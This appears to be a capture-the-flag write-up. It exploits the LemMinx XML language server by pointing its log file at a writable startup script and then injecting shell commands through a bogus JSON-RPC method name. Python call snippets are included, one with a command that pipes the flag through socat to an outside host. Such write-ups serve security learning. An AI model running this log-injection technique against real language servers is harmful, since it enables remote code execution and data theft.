LemMinx is started for each connection from `/home/ctf/.../run.sh`, which is writable.

We do an `initialize` call to make LemMinx start writing it's logs to `run.sh`:

```python
call('initialize', {
    'rootUri': 'file:///tmp',
    'initializationOptions': {
        'settings': {
            'xml': {
                "logs": {
                    "client": True,
                    "file": "/proc/self/cwd/run.sh"
                },
            },
        },
    },
    'capabilities': { # probably not needed, leftover from past experimentation
        'executeCommand': {
            'dynamicRegistration': True,
        },
    },
})
```

Then call a non-existent JSON-RPC endpoint to pollute `run.sh` with our code:

```python
call('aaaa\n/printflag | socat - tcp:your.super.secret.public.ip.box.com:1337\n\nbbbb',{})
```

There are several ways to get a newline and an arbitrary string into `run.sh`, but the above
also avoids printing any `(` characters, which would trip up the shell.

Then we disconnect and connect again to execute `/printflag`.
